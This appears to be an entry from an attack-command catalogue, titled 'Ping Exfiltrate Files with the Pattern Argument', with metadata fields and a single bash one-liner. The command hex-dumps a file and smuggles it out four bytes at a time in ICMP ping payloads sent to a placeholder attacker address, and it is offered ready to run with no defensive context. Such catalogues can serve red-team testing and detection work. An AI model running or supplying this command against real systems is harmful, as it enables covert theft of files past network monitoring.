---
id: 34a97d5b-3198-457d-99b7-3b9b4b0caffd
name: Ping Exfiltrate Files with the Pattern Argument
type: command
executor: bash
data: xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP;
  done
output: null
created_at: '2019-10-18T22:31:55.447546+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Ping Exfiltrate Files with the Pattern Argument

```bash
xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP; done
```
